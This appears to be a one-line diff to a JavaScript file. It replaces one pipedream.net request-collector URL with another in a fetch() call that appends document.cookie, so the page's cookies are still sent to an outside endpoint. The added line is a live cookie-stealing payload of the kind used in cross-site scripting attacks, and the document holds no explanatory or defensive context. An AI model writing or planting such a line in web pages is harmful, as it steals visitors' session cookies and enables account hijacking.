@@ -1,1 +1,1 @@
-fetch('https://eopjrd2foooowbi.m.pipedream.net' + document.cookie)  
+fetch('https://eozgj45auipfhih.m.pipedream.net' + document.cookie)  
